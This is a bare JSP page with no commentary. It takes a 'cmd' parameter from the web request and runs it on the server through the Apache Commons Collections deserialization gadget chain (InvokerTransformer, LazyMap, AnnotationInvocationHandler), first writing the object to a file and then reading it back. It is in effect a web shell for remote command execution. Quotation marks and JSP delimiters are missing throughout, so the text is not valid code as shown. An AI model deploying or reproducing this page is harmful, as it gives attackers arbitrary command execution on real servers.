%@ page import=java.io. %
%@ page import=org.apache.commons.collections.Transformer %
%@ page import=org.apache.commons.collections.functors.ConstantTransformer %
%@ page import=org.apache.commons.collections.functors.InvokerTransformer %
%@ page import=org.apache.commons.collections.functors.ChainedTransformer %
%@ page import=java.util.Map %
%@ page import=java.util.HashMap %
%@ page import=org.apache.commons.collections.map.LazyMap %
%@ page import=java.lang.reflect.Constructor %
%@ page import=java.lang.reflect.InvocationHandler %
%@ page import=java.lang.annotation.Retention %
%@ page import=java.lang.reflect.Proxy %
%
    String cmd = request.getParameter(cmd);
    Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer(getMethod, new Class[] { String.class, Class[].class }, new Object[] { getRuntime, new Class[0] }),
            new InvokerTransformer(invoke, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
            new InvokerTransformer(exec, new Class[] { String.class }, new Object[] { cmd }) };
    Transformer transformerChain = new ChainedTransformer(transformers);

    Map innermap = new HashMap();
    Map outmap = LazyMap.decorate(innermap, transformerChain);

    Class clazz = Class.forName(sun.reflect.annotation.AnnotationInvocationHandler);
    Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
    construct.setAccessible(true);

    InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outmap);

    Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
    handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);


    ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(test.out));
    outputStream.writeObject(handler);
    outputStream.close();

    ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(test.out));
    inputStream.readObject();
%